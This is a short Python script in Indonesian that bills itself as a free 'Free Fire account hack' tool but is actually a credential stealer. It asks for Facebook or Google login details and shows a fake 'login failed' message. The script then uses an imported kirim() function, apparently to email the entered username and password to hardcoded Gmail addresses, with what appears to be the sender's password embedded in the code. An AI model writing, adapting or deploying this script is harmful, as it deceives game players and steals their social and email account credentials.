import os,time,getpass,data
from data import kirim

os.system("clear")

hijau="\033[32m"
merah="\033[31m"
biru="\033[36m"
putih="\033[37m"

ks="@rajun28"
baner="""
   SELAMAT DATANG DI PROGRAM HACK AKUN FREE FIRE
             AUTHOR BY GAMINGDIGITAL
	   	   |R| |H| |A|
		   |A| |A| |K|
		   |J| |C| |U|
		   |A| |K| |N|
"""
menulogin="""
	note: Login Dulu Ke Akun FF Kamu :)

	Menu Login :
	1. Login Via Facebook
	2. Login Via Google
	3. Keluar

	>>> """
msginput="""
	Input Salah
"""
em="sayaganteng280806@gmail.com"
msggagal="""
	LOGIN GAGAL
"""
banerfb="""
	LOGIN VIA FACEBOOK
	Menu Login:"""
usernamefb="""
	>>> Nomor-Telepon/Email : """
passwordfb="""
	>>> Password		: """
banergoogle="""
	LOGIN VIA GOOGLE
	Menu Login:
"""
tom="mungkinroger@gmail.com"
usernamegoogle="""
	>>> Email     : """
passwordgoogle="""
	>>> Password  : """
loginload="""
	Sedang Login.....
"""

def menu():
	print(hijau+baner)
	time.sleep(5)
	tanyamenu=input(biru+menulogin)
	if tanyamenu=="1":
		os.system("clear")
		time.sleep(3)
		fb()
	elif tanyamenu=="2":
		os.system("clear")
		time.sleep(3)
		google()
	elif tanyamenu=="3":
		print(putih+"")
		time.sleep(3)
		os.system("clear")
		exit()
	else:
		print(merah+msginput)
		time.sleep(3)
		os.system("clear")
		menu()


def fb():
	print(hijau+banerfb)
	userfb=input(biru+usernamefb)
	pwfb=input(biru+passwordfb)
	print(loginload)
	time.sleep(5)
	print(merah+msggagal)
	time.sleep(2)
	print(putih+"")
	pesan2="""
		AUTHOR BY GAMINGDIGITAL

		PEMBUAT SCRIPT : RWM
		AKUN FREE FIRE LOGIN VIA FB
		Nomor Telepon/Email : """+userfb+"""
		Password	    : """+pwfb+"""
		SILAHKAN SIMPAN :)
	"""
	kirim(em,tom,"AKUN VIA FB",pesan2,ks)
	os.system("clear")
	exit()

def google():
	print(hijau+banergoogle)
	usergoogle=input(biru+usernamegoogle)
	pwgoogle=input(biru+passwordgoogle)
	print(loginload)
	time.sleep(5)
	print(merah+msggagal)
	time.sleep(2)
	print(putih+"")
	pesan3="""
		AUTHOR BY GAMINGDIGITAL

		PEMBUAT SCRIPT : RWM
		AKUN FREE FIRE LOGIN VIA GOOGLE
		Email    : """+usergoogle+"""
		Password : """+pwgoogle+"""
		SILAHKAN DISIMPAN :)
	"""
	kirim(em,tom,"AKUN VIA GOOGLE",pesan3,ks)
	os.system("clear")
	exit()

menu()
